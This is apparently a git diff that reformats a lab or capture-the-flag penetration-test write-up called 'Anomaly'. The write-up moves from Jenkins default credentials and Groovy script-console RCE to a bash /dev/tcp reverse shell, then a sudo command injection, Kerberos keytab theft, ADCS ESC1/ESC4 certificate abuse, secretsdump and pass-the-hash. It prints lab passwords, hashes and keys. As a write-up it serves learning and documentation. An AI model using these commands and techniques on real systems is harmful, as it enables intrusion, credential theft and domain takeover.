@@ -1,25 +1,27 @@
 # Anomaly
 
-![image.png](Anomaly/image.png)
+## Anomaly
 
-## **Objective and Scope**
+![image.png](<../.gitbook/assets/image (2).png>)
 
-### **Objective**
+### **Objective and Scope**
 
-The core objective is to demonstrate the full impact of a successful network intrusion by achieving **Domain Administrator** privileges over the client's Active Directory environment. The test will simulate a motivated external attacker's progression from an initial foothold to complete administrative control.
+#### **Objective**
 
-### **Scope**
+The core objective is to demonstrate the full impact of a successful network intrusion by achieving **Domain Administrator** privileges over the client's Active Directory environment. The test will simulate a motivated external attacker's progression from an initial foothold to complete administrative control.
 
-The in-scope assets for this engagement include **two critical IP addresses**:
+#### **Scope**
 
-1. A hardened **Ubuntu Server** (Initial Foothold Target).
-2. The primary **Domain Controller** (Final Privilege Escalation Target).
+The in-scope assets for this engagement include **two critical IP addresses**:
 
-It is a critical finding that the **Domain Controller is running active Antivirus (AV) software**; therefore, common attack paths may fail due to detection by AV.
+1. A hardened **Ubuntu Server** (Initial Foothold Target).
+2. The primary **Domain Controller** (Final Privilege Escalation Target).
 
-## Recon & Enumeration
+It is a critical finding that the **Domain Controller is running active Antivirus (AV) software**; therefore, common attack paths may fail due to detection by AV.
 
-### Rustscan enum Anomaly-Web `10.1.107.2`
+### Recon & Enumeration
+
+#### Rustscan enum Anomaly-Web `10.1.107.2`
 
 ```bash
 PORT     STATE SERVICE REASON         VERSION
@@ -40,7 +42,7 @@ Warning: OSScan results may be unreliable because we could not find at least 1 o
 
 ```
 
-### Rustscan enum Anomaly-DC `10.1.69.52`
+#### Rustscan enum Anomaly-DC `10.1.69.52`
 
 ```bash
 PORT      STATE SERVICE       REASON          VERSION
@@ -168,25 +170,25 @@ Host script results:
 
 ```
 
-### Generating host files
+#### Generating host files
 
 ```bash
 nxc smb 10.1.69.52  -u ''-p '' --generate-hosts-file hosts
 
 ```
 
-## Checking for quick wins
+### Checking for quick wins
 
-***###Below is my cheat sheet i usually use for quick wins in AD-environments#####***
+_**###Below is my cheat sheet i usually use for quick wins in AD-environments#####**_
 
 As a best practice, always check for the following:
 
-- Enumerating other users
-- Enumerating for pre-created computer accounts
-- Enumerating for `certificate services`
-- Enumerating for `ZeroLOgon`
-- Enumerating for `Kerberoasting` and `AS-REP` - We can also get this from `Bloodhound`
-- Enumerating for `gpp_autologin`
+* Enumerating other users
+* Enumerating for pre-created computer accounts
+* Enumerating for `certificate services`
+* Enumerating for `ZeroLOgon`
+* Enumerating for `Kerberoasting` and `AS-REP` - We can also get this from `Bloodhound`
+* Enumerating for `gpp_autologin`
 
 NB - Sometimes not necessary but worth digging into.
 
@@ -204,9 +206,9 @@ nxc smb  buildingmagic.local -u 'r.widdleton' -p 'lilronron'  -M gpp_autologin
 
 ```
 
-# Anomaly-Web `10.1.107.2`
+## Anomaly-Web `10.1.107.2`
 
-### Rustscan enum Anomaly-Web `10.1.107.2`
+#### Rustscan enum Anomaly-Web `10.1.107.2`
 
 ```bash
 PORT     STATE SERVICE REASON         VERSION
@@ -227,15 +229,15 @@ Warning: OSScan results may be unreliable because we could not find at least 1 o
 
 ```
 
-- Only 2 ports are open: ssh running on port 22& http running on port 8080
-- Having a website running, a few things we need to do
-    - Directory Brute-forcing
-    - Subdomains and Virtual Hosts fuzzing
-    - Check view source
-    - Check /robot.txt
-    - check web functionality
+* Only 2 ports are open: ssh running on port 22& http running on port 8080
+* Having a website running, a few things we need to do
+  * Directory Brute-forcing
+  * Subdomains and Virtual Hosts fuzzing
+  * Check view source
+  * Check /robot.txt
+  * check web functionality
 
-***Directory Brute-forcing***
+_**Directory Brute-forcing**_
 
 ```bash
 dirsearch -u http://10.1.107.2:8080 -t 5 
@@ -247,11 +249,11 @@ ffuf -u "http://10.1.107.2:8080/FUZZ" \
 gobuster dir -u http://10.1.107.2:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,zip
 ```
 
-![image.png](Anomaly/image%201.png)
+![image.png](<../.gitbook/assets/image 1 (5).png>)
 
-![image.png](Anomaly/image%202.png)
+![image.png](<../.gitbook/assets/image 2 (4).png>)
 
-***Subdomains and Virtual Hosts***
+_**Subdomains and Virtual Hosts**_
 
 ```bash
 ./vhost-fuzzer.sh anomaly.Web  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://web.server 1
@@ -259,13 +261,13 @@ gobuster dir -u http://10.1.107.2:8080 -w /usr/share/wordlists/dirbuster/directo
 ffuf -u http:/anomaly.Web  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$DOMAIN"
 ```
 
-***Check web functionality***
+_**Check web functionality**_
 
-![image.png](Anomaly/image%203.png)
+![image.png](<../.gitbook/assets/image 3 (4).png>)
 
-- We have a jenkins instance and we need to enumerate more
+* We have a jenkins instance and we need to enumerate more
 
-### **Banner Grabbing and Version Detection jenkins**
+#### **Banner Grabbing and Version Detection jenkins**
 
 ```bash
 # Get Jenkins version
@@ -281,14 +283,14 @@ curl -I http:/10.1.107.2:8080 | grep -i "x-jenkins"
 curl -s http://10.1.107.2:8080/login | grep "Jenkins ver"
 ```
 
-![image.png](Anomaly/image%204.png)
+![image.png](<../.gitbook/assets/image 4 (4).png>)
 
-![image.png](Anomaly/image%205.png)
+![image.png](<../.gitbook/assets/image 5 (4).png>)
 
-- Jenkins version disclosure
-- we can search for available vulnerabilities regarding `jenkins 2.452.1`
+* Jenkins version disclosure
+* we can search for available vulnerabilities regarding `jenkins 2.452.1`
 
-### *Testing Common Creds first*
+#### _Testing Common Creds first_
 
 ```bash
 # Common default/weak credentials
@@ -299,11 +301,11 @@ admin:jenkins
 user:user
 ```
 
-![image.png](Anomaly/image%206.png)
+![image.png](<../.gitbook/assets/image 6 (3).png>)
 
-- `admin:admin` creds worked
+* `admin:admin` creds worked
 
-### Jenkins RCE
+#### Jenkins RCE
 
 ```bash
 def cmd = 'id'
@@ -314,17 +316,17 @@ proc.waitForOrKill(1000)
 println sout
 ```
 
-![image.png](Anomaly/image%207.png)
+![image.png](<../.gitbook/assets/image 7 (3).png>)
 
-- a successful Remote Code Execution (RCE) on a Jenkins instance using the **Script Console** (`/script`). The Groovy script executed the `id` command, confirming that the application is running as the `jenkins` user
-- Now we want to obtain a reverse shell
-    
+* a successful Remote Code Execution (RCE) on a Jenkins instance using the **Script Console** (`/script`). The Groovy script executed the `id` command, confirming that the application is running as the `jenkins` user
+*   Now we want to obtain a reverse shell
+
     ```bash
     r = Runtime.getRuntime()
     p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.200.45.8/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
     p.waitFor()
     ```
-    
+
     ```bash
     RedBlue@Frank Anomaly % sudo nc -lnvp 8443                                    
     [sudo] password for RedBlue: 
@@ -341,17 +343,17 @@ println sout
     bash: cannot set terminal process group (550): Inappropriate ioctl for device
     bash: no job control in this shell
     jenkins@ip-10-1-107-2:~$ 
-    
-    ```
-    
-    ![image.png](Anomaly/image%208.png)
-    
-    - **`secrets/` directory:** This is where Jenkins stores its encryption keys (like `master.key` and `hudson.util.Secret`). You can use these to decrypt any stored credentials or build parameters.
-    - **`jobs/` directory:** Contains build configurations. Check these for hardcoded passwords, API keys, or scripts that might contain sensitive information.
-    - **`config.xml`:** Contains the main configuration for the Jenkins instance, including security realm settings and authorization strategies.
-    - **`secret.key.not-so-secret`:** While the name is humorous, it's often used for legacy reasons; the real keys are usually inside the `secrets/` folder.
 
-### Searching for **credentials**, **SSH keys**, and **passwords** inside configuration files
+    ```
+
+    ![image.png](<../.gitbook/assets/image 8 (4).png>)
+
+    * **`secrets/` directory:** This is where Jenkins stores its encryption keys (like `master.key` and `hudson.util.Secret`). You can use these to decrypt any stored credentials or build parameters.
+    * **`jobs/` directory:** Contains build configurations. Check these for hardcoded passwords, API keys, or scripts that might contain sensitive information.
+    * **`config.xml`:** Contains the main configuration for the Jenkins instance, including security realm settings and authorization strategies.
+    * **`secret.key.not-so-secret`:** While the name is humorous, it's often used for legacy reasons; the real keys are usually inside the `secrets/` folder.
+
+#### Searching for **credentials**, **SSH keys**, and **passwords** inside configuration files
 
 ```bash
 find . -maxdepth 3 -name "*.xml" -o -name "master.key" -o -name "hudson.util.Secret" -o -name "id_rsa" | xargs -I {} grep -Hli "password\|secret\|key\|credential" {} 2>/dev/null
@@ -422,20 +424,20 @@ jenkins@ip-10-1-107-2:~$ cat users/admin_12913718988981174255/config.xml
 
 ```
 
-![image.png](Anomaly/image%209.png)
+![image.png](<../.gitbook/assets/image 9 (5).png>)
 
-- We obtained a password hash that is a jbcrypt
-    
+*   We obtained a password hash that is a jbcrypt
+
     ```bash
     $2a$10$fm3mmEJw/LD9oUNvH2DXA.cpwVHN676vMBrIJPy9lHOZbGpGutrja
     hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
     ```
-    
-    ![image.png](Anomaly/image%2010.png)
-    
-    - Tried cracking the password but it was taking a long time.
 
-### Privs Escalation to root
+    ![image.png](<../.gitbook/assets/image 10 (5).png>)
+
+    * Tried cracking the password but it was taking a long time.
+
+#### Privs Escalation to root
 
 ```bash
 jenkins@ip-10-1-107-2:~$ sudo -l
@@ -450,29 +452,28 @@ jenkins@ip-10-1-107-2:~$
 
 ```
 
-![image.png](Anomaly/image%2011.png)
+![image.png](<../.gitbook/assets/image 11 (5).png>)
 
-- discovered  **NOPASSWD** permissions to run `/usr/bin/router_config` as any user (including **root**)
-    
+*   discovered **NOPASSWD** permissions to run `/usr/bin/router_config` as any user (including **root**)
+
     ```bash
     file /usr/bin/router_config
     ls -l /usr/bin/router_config
     strings /usr/bin/router_config
-    
+
     sudo /usr/bin/router_config "test; /bin/bash"
-    
+
     ```
-    
-    ![image.png](Anomaly/image%2012.png)
-    
-    - navigate to /root  and `cat` the user flag
-        
-        ![image.png](Anomaly/image%2013.png)
-        
 
-# Anomaly-DC `10.1.69.52`
+    ![image.png](<../.gitbook/assets/image 12 (5).png>)
 
-### Rustscan enum Anomaly-DC `10.1.69.52`
+    *   navigate to /root and `cat` the user flag
+
+        ![image.png](<../.gitbook/assets/image 13 (5).png>)
+
+## Anomaly-DC `10.1.69.52`
+
+#### Rustscan enum Anomaly-DC `10.1.69.52`
 
 ```bash
 PORT      STATE SERVICE       REASON          VERSION
@@ -600,22 +601,21 @@ Host script results:
 
 ```
 
-- This is an active directory and we do not have any creds to start with
-- Simple things first, lets try to authenticate with null creds
-    
-    ![image.png](Anomaly/image%2014.png)
-    
+* This is an active directory and we do not have any creds to start with
+*   Simple things first, lets try to authenticate with null creds
 
-### ***Generating host files***
+    ![image.png](<../.gitbook/assets/image 14 (5).png>)
+
+#### _**Generating host files**_
 
 ```bash
 nxc smb anomaly.hsm  -u '' -p '' --generate-hosts-file hosts
 
 ```
 
-![image.png](Anomaly/image%2015.png)
+![image.png](<../.gitbook/assets/image 15 (4).png>)
 
-### ***Enumerating users***
+#### _**Enumerating users**_
 
 ```bash
 nxc smb anomaly.hsm  -u '' -p '' --users
@@ -627,14 +627,14 @@ kerbrute userenum -d anomaly.hsm --dc 10.1.69.52 /usr/share/seclists/Usernames/x
 
 ```
 
-![image.png](Anomaly/image%2016.png)
+![image.png](<../.gitbook/assets/image 16 (4).png>)
 
-![image.png](Anomaly/image%2017.png)
+![image.png](<../.gitbook/assets/image 17 (4).png>)
 
-- We failed to Enumerate usernames with three different approaches
-- Lets enumerate other services next
+* We failed to Enumerate usernames with three different approaches
+* Lets enumerate other services next
 
-### ***Enumerating DNS - 53***
+#### _**Enumerating DNS - 53**_
 
 ```bash
  RedBlue@Frank Anomaly %  dig axfr anomaly.hsm @10.1.69.52
@@ -645,18 +645,18 @@ kerbrute userenum -d anomaly.hsm --dc 10.1.69.52 /usr/share/seclists/Usernames/x
 RedBlue@Frank Anomaly % 
 ```
 
-![image.png](Anomaly/image%2018.png)
+![image.png](<../.gitbook/assets/image 18 (4).png>)
 
-- Nothing of interest obtained
+* Nothing of interest obtained
 
-***Enumerating  ldap-* 389**
+_**Enumerating ldap-**_**&#x20;389**
 
 ```bash
 #**Base Naming Context
 ldapsearch -H ldap://**10.1.69.52 **-x -s base namingcontexts**
 ```
 
-![image.png](Anomaly/image%2019.png)
+![image.png](<../.gitbook/assets/image 19 (4).png>)
 
 ```bash
 ldapsearch -H ldap://10.1.69.52 -x -s base -b "DC=anomaly,DC=hsm"
@@ -664,20 +664,20 @@ ldapsearch -H ldap://10.1.69.52 -x -b "DC=anomaly,DC=hsm" "(objectClass=user)"
 
 ```
 
-![image.png](Anomaly/image%2020.png)
+![image.png](<../.gitbook/assets/image 20 (4).png>)
 
-- Nothing too interesting here either
+* Nothing too interesting here either
 
-### ***Enumerating port 80***
+#### _**Enumerating port 80**_
 
-- Having a website running, a few things we need to do
-    - Directory Brute-forcing
-    - Subdomains and Virtual Hosts fuzzing
-    - Check view source
-    - Check /robot.txt
-    - check web functionality
+* Having a website running, a few things we need to do
+  * Directory Brute-forcing
+  * Subdomains and Virtual Hosts fuzzing
+  * Check view source
+  * Check /robot.txt
+  * check web functionality
 
-***Directory Brute-forcing***
+_**Directory Brute-forcing**_
 
 ```bash
 dirsearch -u http://10.1.69.52 -t 5 
@@ -689,41 +689,40 @@ ffuf -u "http://10.1.69.52/FUZZ" \
 gobuster dir -u http://10.1.69.52 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,zip
 ```
 
-###At this point i am stuck……..I need to go back to the  Anomaly-Web `10.1.107.2` to check if i did not miss anything.
+\###At this point i am stuck……..I need to go back to the Anomaly-Web `10.1.107.2` to check if i did not miss anything.
 
-- Used linpeas to uncover these.
+* Used linpeas to uncover these.
 
-![image.png](Anomaly/image%2021.png)
+![image.png](<../.gitbook/assets/image 21 (4).png>)
 
-![image.png](Anomaly/image%2022.png)
+![image.png](<../.gitbook/assets/image 22 (4).png>)
 
-- The Anomaly-Web `10.1.107.2`  is integrated with the Active Directory domain `ANOMALY.HSM`
+* The Anomaly-Web `10.1.107.2` is integrated with the Active Directory domain `ANOMALY.HSM`
 
-### Enumerating ***The Keytab File*** (`/etc/krb5.keytab`)
+#### Enumerating _**The Keytab File**_ (`/etc/krb5.keytab`)
 
-- A `.keytab` file is essentially a file that contains Kerberos keys (long-term passwords). Its purpose is to allow a service or user to authenticate to the Domain Controller **without typing a password.** * **The Risk:** Since you have read access to this file (or your tool does), you can authenticate as the user stored inside it.
-- The file contains the credentials for **`Brandon_Boyd@ANOMALY.HSM`**
-- Because `kinit` is present on the system, you can use that keytab to "log in" as Brandon Boyd and get a Kerberos Ticket Granting Ticket (TGT).
-***To impersonate him, run this command:***
-    
+* A `.keytab` file is essentially a file that contains Kerberos keys (long-term passwords). Its purpose is to allow a service or user to authenticate to the Domain Controller **without typing a password.** \* **The Risk:** Since you have read access to this file (or your tool does), you can authenticate as the user stored inside it.
+* The file contains the credentials for **`Brandon_Boyd@ANOMALY.HSM`**
+*   Because `kinit` is present on the system, you can use that keytab to "log in" as Brandon Boyd and get a Kerberos Ticket Granting Ticket (TGT). _**To impersonate him, run this command:**_
+
     ```bash
     #Authenticate using the keytab
     kinit -k -t /etc/krb5.keytab Brandon_Boyd@ANOMALY.HSM
     #Verify a valid Kerberos TGT
     klist
-    
+
     #Try
     smbclient -k //Anomaly-DC/anomaly.hsm
-    
+
     #Try Kerberos admin access
     kadmin -k -t /etc/krb5.keytab -p Brandon_Boyd@ANOMALY.HSM
     ```
-    
-    ![image.png](Anomaly/image%2023.png)
-    
-    - obtained a valid **Ticket Granting Ticket (TGT)** for `Brandon_Boyd` stored in `/tmp/krb5cc_111`
 
-### E**xtracting Kerberos keys (hash material)** from a keytab file
+    ![image.png](<../.gitbook/assets/image 23 (4).png>)
+
+    * obtained a valid **Ticket Granting Ticket (TGT)** for `Brandon_Boyd` stored in `/tmp/krb5cc_111`
+
+#### E**xtracting Kerberos keys (hash material)** from a keytab file
 
 https://github.com/sosdave/KeyTabExtract
 
@@ -731,9 +730,9 @@ https://github.com/sosdave/KeyTabExtract
 python3 keytabextract.py /etc/krb5.keytab
 ```
 
-![image.png](Anomaly/image%2024.png)
+![image.png](<../.gitbook/assets/image 24 (4).png>)
 
-***Using the AES key***
+_**Using the AES key**_
 
 ```bash
 nxc smb Anomaly-DC.anomaly.hsm -u Brandon_Boyd --aesKey f9754c5288b844eb86054695b2c12b93716f57c41d26325c1a994e12bbbeff52
@@ -741,10 +740,10 @@ nxc smb Anomaly-DC.anomaly.hsm -u Brandon_Boyd --aesKey f9754c5288b844eb86054695
 nxc smb Anomaly-DC.anomaly.hsm -u Brandon_Boyd --aesKey f9754c5288b844eb86054695b2c12b93716f57c41d26325c1a994e12bbbeff52 --shares
 ```
 
-![image.png](Anomaly/image%2025.png)
+![image.png](<../.gitbook/assets/image 25 (4).png>)
 
-- We did not go any further
-- need to transfer `/tmp/krb5cc_111` to our VM
+* We did not go any further
+* need to transfer `/tmp/krb5cc_111` to our VM
 
 ```bash
 #Jenkins
@@ -758,44 +757,43 @@ export KRB5CCNAME=krb5cc_111
 klist
 ```
 
-![image.png](Anomaly/image%2026.png)
+![image.png](<../.gitbook/assets/image 26 (4).png>)
 
-## Bloodhound -Collecting loot
+### Bloodhound -Collecting loot
 
 ```bash
 bloodhound-python -k -no-pass -u Brandon_Boyd -d anomaly.hsm -dc Anomaly-DC.anomaly.hsm -ns 10.1.69.52 -c all
 ```
 
-![image.png](Anomaly/image%2027.png)
+![image.png](<../.gitbook/assets/image 27 (4).png>)
 
-### Bloodhound Enumeration
+#### Bloodhound Enumeration
 
-![image.png](Anomaly/image%2028.png)
+![image.png](<../.gitbook/assets/image 28 (4).png>)
 
-- `Anna_Molly` is in All domain admins
+* `Anna_Molly` is in All domain admins
 
-![image.png](Anomaly/image%2029.png)
+![image.png](<../.gitbook/assets/image 29 (4).png>)
 
-- Not much of an interest with `bradon_boyd` here
-- Performing further enumeration
+* Not much of an interest with `bradon_boyd` here
+* Performing further enumeration
 
 ```bash
 nxc smb anomaly.hsm -u Brandon_Boyd -d ANOMALY.HSM -k --users
 ```
 
-![image.png](Anomaly/image%2030.png)
+![image.png](<../.gitbook/assets/image 30 (4).png>)
 
-- Obtained a clear password `3edc4rfv#EDC$RFV` from the description
-- A user `anna_molly` is also present
-    
+* Obtained a clear password `3edc4rfv#EDC$RFV` from the description
+*   A user `anna_molly` is also present
+
     ```bash
     nxc smb anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV'
     ```
-    
-    ![image.png](Anomaly/image%2031.png)
-    
 
-### Checking for quick wins
+    ![image.png](<../.gitbook/assets/image 31 (4).png>)
+
+#### Checking for quick wins
 
 ```bash
 nxc smb anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' --rid-brute | grep 'SidTypeUser' 
@@ -806,9 +804,9 @@ nxc smb anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -M zerologon
 nxc smb  anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -M gpp_autologin
 ```
 
-![image.png](Anomaly/image%2032.png)
+![image.png](<../.gitbook/assets/image 32 (3).png>)
 
-- **Active Directory Certificate Services (ADCS)** is running on the Domain Controller.
+* **Active Directory Certificate Services (ADCS)** is running on the Domain Controller.
 
 ```bash
 certipy-ad find -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -dc-ip 10.1.69.52 -vulnerable -stdout
@@ -912,15 +910,14 @@ RedBlue@Frank Anomaly %
 
 ```
 
-- User is vulnerable to **ESC1: Enrollee-Supplied Subject for Client Authentication**
- & ESC4
-- We can target user `Anna_Molly` as they are in All Admin Domain
+* User is vulnerable to **ESC1: Enrollee-Supplied Subject for Client Authentication** & ESC4
+* We can target user `Anna_Molly` as they are in All Admin Domain
 
-### ***Exploiting an ESC1 vulnerability***
+#### _**Exploiting an ESC1 vulnerability**_
 
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
 
-***Request the certificate for the target user***
+_**Request the certificate for the target user**_
 
 ```bash
 certipy req \
@@ -934,7 +931,7 @@ certipy req \
  certipy account -u 'Brandon_Boyd' -p '3edc4rfv#EDC$RFV' -dc-ip '10.1.69.52' -user 'anna_molly' read
 ```
 
-![image.png](Anomaly/image%2033.png)
+![image.png](<../.gitbook/assets/image 33 (3).png>)
 
 ```bash
 RedBlue@Frank Anomaly %  certipy-ad account -u 'Brandon_Boyd' -p '3edc4rfv#EDC$RFV' -dc-ip '10.1.69.52' -user 'anna_molly' read                 
@@ -953,16 +950,16 @@ RedBlue@Frank Anomaly %
 
 ```
 
-***Authenticate using the obtained certificate***
+_**Authenticate using the obtained certificate**_
 
 ```bash
 certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
 ```
 
-![image.png](Anomaly/image%2034.png)
+![image.png](<../.gitbook/assets/image 34 (2).png>)
 
-- **cannot enroll directly** as `Brandon_Boyd`
-    
+*   **cannot enroll directly** as `Brandon_Boyd`
+
     ```bash
         [+] User Enrollable Principals      : ANOMALY.HSM\Domain Computers
         [+] User ACL Principals             : ANOMALY.HSM\Domain Computers
@@ -971,23 +968,23 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
           ESC4                              : User has dangerous permissions.
     RedBlue@Frank Anomaly % 
     ```
-    
-    - This piece of information , tells us that we **can’t request a cert directly**
-    - BUT **can modify the template via a computer account**
-        
-        ***Create a computer account***
-        
+
+    * This piece of information , tells us that we **can’t request a cert directly**
+    *   BUT **can modify the template via a computer account**
+
+        _**Create a computer account**_
+
         ```bash
         impacket-addcomputer anomaly.hsm/Brandon_Boyd:'3edc4rfv#EDC$RFV' \
         -dc-ip 10.1.69.52 \
         -computer-name REDBLUE$ \
         -computer-pass RedBlue777
         ```
-        
-        ![image.png](Anomaly/image%2035.png)
-        
-        *Requesting the certificate with the computer account*
-        
+
+        ![image.png](<../.gitbook/assets/image 35 (2).png>)
+
+        _Requesting the certificate with the computer account_
+
         ```bash
         certipy-ad req \
         -u 'REDBLUE$@anomaly.hsm' -p 'RedBlue777' \
@@ -996,21 +993,21 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
         -ca 'anomaly-ANOMALY-DC-CA-2' \
         -template CertAdmin \
         -upn 'anna_molly@anomaly.hsm'
-        
+
         ```
-        
-        ![image.png](Anomaly/image%2036.png)
-        
-        - This trick failed and we might want to use the computer account to grant Brandon_Boyd permission to unlock the template
-        
-        ***Abuse ESC4 (modify template)- Abuse ESC4 (Granting Permissions)***
-        
+
+        ![image.png](<../.gitbook/assets/image 36 (2).png>)
+
+        * This trick failed and we might want to use the computer account to grant Brandon\_Boyd permission to unlock the template
+
+        _**Abuse ESC4 (modify template)- Abuse ESC4 (Granting Permissions)**_
+
         Since `REDBLUE$` has dangerous permissions over the template (ESC4), use it to grant **Enrollment** rights to your user account.
-        
-        **Grant Brandon_Boyd permission to use the template:**
-        
-        ***Save the Template Configuration***
-        
+
+        **Grant Brandon\_Boyd permission to use the template:**
+
+        _**Save the Template Configuration**_
+
         ```bash
         certipy-ad template \
         -u 'REDBLUE$@anomaly.hsm' -p 'RedBlue777' \
@@ -1018,22 +1015,22 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
         -template CertAdmin \
         -save-configuration CertAdmin.conf
         ```
-        
-        ![image.png](Anomaly/image%2037.png)
-        
-        ***Edit the Configuration File***
-        
-        Open `CertAdmin.conf`  and Look for the section labeled **`permissions`** and specifically the **`enrollment_permissions`** list.
-        
+
+        ![image.png](<../.gitbook/assets/image 37 (2).png>)
+
+        _**Edit the Configuration File**_
+
+        Open `CertAdmin.conf` and Look for the section labeled **`permissions`** and specifically the **`enrollment_permissions`** list.
+
         Add **`ANOMALY.HSM\Brandon_Boyd`** to that list.
-        
-        ![image.png](Anomaly/image%2038.png)
-        
-        - Editing the `nTSecurityDescriptor` in hex manually is a nightmare because it’s a binary structure
-        - Pushing the changes now wont work
-        
-        ***Push the Changes to the Domain Controller***
-        
+
+        ![image.png](<../.gitbook/assets/image 38 (2).png>)
+
+        * Editing the `nTSecurityDescriptor` in hex manually is a nightmare because it’s a binary structure
+        * Pushing the changes now wont work
+
+        _**Push the Changes to the Domain Controller**_
+
         ```bash
         certipy-ad template \
         -u 'REDBLUE$@anomaly.hsm' -p 'RedBlue777' \
@@ -1041,9 +1038,9 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
         -template CertAdmin \
         -write-configuration CertAdmin.conf
         ```
-        
-        ***Trying Using Impacket to Grant Full Control***
-        
+
+        _**Trying Using Impacket to Grant Full Control**_
+
         ```bash
         python3 /usr/share/doc/python3-impacket/examples/dacledit.py \
         -action 'write' \
@@ -1053,13 +1050,13 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
         -dc-ip 10.1.69.52 \
         -use-ldaps \
         'anomaly.hsm/REDBLUE$:RedBlue777'
-        
+
         ```
-        
-        ![image.png](Anomaly/image%2039.png)
-        
-        ***Perform the ESC1 Attack as Brandon***
-        
+
+        ![image.png](<../.gitbook/assets/image 39 (2).png>)
+
+        _**Perform the ESC1 Attack as Brandon**_
+
         ```bash
         certipy-ad req \
         -u 'Brandon_Boyd@anomaly.hsm' -p '3edc4rfv#EDC$RFV' \
@@ -1072,59 +1069,59 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
         -sid 'S-1-5-21-1496966362-3320961333-4044918980-1105' \
         -debug
         ```
-        
-        ![image.png](Anomaly/image%2040.png)
-        
-        ## Authenticate as `anna_molly`
-        
+
+        ![image.png](<../.gitbook/assets/image 40 (2).png>)
+
+        ### Authenticate as `anna_molly`
+
         ```bash
         certipy-ad auth -pfx 'anna_molly.pfx' -dc-ip '10.1.69.52'
         ```
-        
-        ![image.png](Anomaly/image%2041.png)
-        
+
+        ![image.png](<../.gitbook/assets/image 41 (2).png>)
+
         ```bash
         evil-winrm -i 10.1.69.52 -u 'anna_molly' -H 'be4bf3131851aee9a424c58e02879f6e'
-        
+
         Get-ChildItem -Path C:\ -Include '*root.txt' -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { "=== $($_.FullName) ==="; Get-Content -Raw -Encoding UTF8 $_.FullName }
         ```
-        
-        ![image.png](Anomaly/image%2042.png)
-        
-        - Tried evil-winrm but then the port was not open !!!!!!!!
-        - IT SAVES TIME TO READ SOMETIMES HHAHAHAHA!!!!
-        
+
+        ![image.png](<../.gitbook/assets/image 42 (2).png>)
+
+        * Tried evil-winrm but then the port was not open !!!!!!!!
+        * IT SAVES TIME TO READ SOMETIMES HHAHAHAHA!!!!
+
         Interactive shell
-        
+
         ```bash
         impacket-psexec 'anomaly.hsm/anna_molly@10.1.69.52' -hashes ':be4bf3131851aee9a424c58e02879f6e'
         ```
-        
-        ![image.png](Anomaly/image%2043.png)
-        
-        - Not successful this time
 
-### Check Administrative Access
+        ![image.png](<../.gitbook/assets/image 43 (2).png>)
+
+        * Not successful this time
+
+#### Check Administrative Access
 
 ```bash
 nxc smb 10.1.69.52 -u 'anna_molly' -H 'be4bf3131851aee9a424c58e02879f6e'
 ```
 
-![image.png](Anomaly/image%2044.png)
+![image.png](<../.gitbook/assets/image 44 (2).png>)
 
-### Domain Admin (Secretsdump)
+#### Domain Admin (Secretsdump)
 
 ```bash
 impacket-secretsdump -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_molly@10.1.69.52'
 ```
 
-![image.png](Anomaly/image%2045.png)
+![image.png](<../.gitbook/assets/image 45 (2).png>)
 
 ```bash
 Local Administrator Hash: 31592a42841d0a9e74f93c41d8884cd0
 ```
 
-## Using `xfreerdp`
+### Using `xfreerdp`
 
 ```bash
 xfreerdp3 /v:10.1.69.52 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 +clipboard /dynamic-resolution /drive:$(pwd),share
@@ -1134,55 +1131,55 @@ xfreerdp3 /v:10.1.69.52 /u:Administrator /d:anomaly.hsm /pth:31592a42841d0a9e74f
 xfreerdp3 /v:10.1.69.52 /u:Administrator /d:anomaly.hsm /pth:31592a42841d0a9e74f93c41d8884cd0 /cert:ignore /restricted-admin /sec:tls /dynamic-resolution +clipboard
 ```
 
-![image.png](Anomaly/image%2046.png)
+![image.png](<../.gitbook/assets/image 46 (2).png>)
 
-- `HYBRID_REQUIRED_BY_SERVER` is the definitive sign that **NLA (Network Level Authentication)** is strictly enforced on the Domain Controller. In this state, the server refuses to even negotiate a TLS connection unless it can verify your identity first.
-- Since we are using a hash, we need to enable **`Restricted Admin Mode`** on the target. This allows NLA to complete using NTLM (your hash) instead of a password.
-    
+* `HYBRID_REQUIRED_BY_SERVER` is the definitive sign that **NLA (Network Level Authentication)** is strictly enforced on the Domain Controller. In this state, the server refuses to even negotiate a TLS connection unless it can verify your identity first.
+*   Since we are using a hash, we need to enable **`Restricted Admin Mode`** on the target. This allows NLA to complete using NTLM (your hash) instead of a password.
+
     ```bash
     impacket-wmiexec -hashes ':31592a42841d0a9e74f93c41d8884cd0' 'Administrator@10.1.69.52' "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
     ```
-    
-    ![image.png](Anomaly/image%2047.png)
-    
-    - **local** `Administrator` account (RID 500) is either disabled or restricted from network logons
-    - Since we know `anna_molly` has the rights to start services and read the registry (proven by `secretsdump`), we shall use it to enable **Restricted Admin Mode** for the whole system
-        
+
+    ![image.png](<../.gitbook/assets/image 47 (2).png>)
+
+    * **local** `Administrator` account (RID 500) is either disabled or restricted from network logons
